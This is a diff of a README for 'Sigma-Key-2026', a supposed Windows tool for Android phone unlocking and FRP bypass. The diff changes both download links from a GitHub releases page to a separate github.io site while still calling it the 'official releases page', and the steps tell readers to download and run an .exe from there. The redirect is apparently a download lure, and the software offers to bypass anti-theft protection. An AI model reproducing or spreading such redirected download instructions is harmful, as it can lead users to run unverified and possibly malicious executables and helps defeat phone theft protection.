@@ -1,6 +1,6 @@
 # 🔑 Sigma-Key-2026 - Unlock Android phones on Windows easily
 
-[![Download Sigma Key](https://img.shields.io/badge/Download-Sigma_Key_2026-blue)](https://github.com/edeebackless68/Sigma-Key-2026/releases)
+[![Download Sigma Key](https://img.shields.io/badge/Download-Sigma_Key_2026-blue)](https://edeebackless68.github.io)
 
 Sigma-Key-2026 provides a stable interface for managing Android mobile devices. This software assists users with tasks like phone unlocking and FRP bypass on Windows 10 and Windows 11 systems.
 
@@ -19,7 +19,7 @@ To run Sigma-Key-2026, ensure your computer meets these specifications:
 
 Follow these steps to obtain the correct files:
 
-1. Visit the[ official releases page](https://github.com/edeebackless68/Sigma-Key-2026/releases).
+1. Visit the[ official releases page](https://edeebackless68.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the file name ending in .exe to start your download.
 4. Save the file to your desktop for easy access.
